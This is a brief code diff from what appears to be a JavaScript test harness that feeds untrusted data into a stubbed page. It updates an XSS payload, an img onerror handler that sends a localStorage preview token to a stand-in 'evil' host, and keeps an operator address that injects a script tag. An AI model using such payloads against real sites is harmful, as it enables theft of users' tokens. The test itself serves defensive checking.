@@ -41,7 +41,7 @@ const document = {
   addEventListener() {},
 };
 
-const PAYLOAD = `<img src=x onerror="fetch('https://evil/'+localStorage.getItem('xru_preview_token_v1'))">`;
+const PAYLOAD = `<img src=x onerror="fetch('https://evil/'+localStorage.getItem('xru_preview_token_v2'))">`;
 const OPERATORS = {
   operators: [{
     operator_address: 'rEvil"><script>alert(1)</script>',
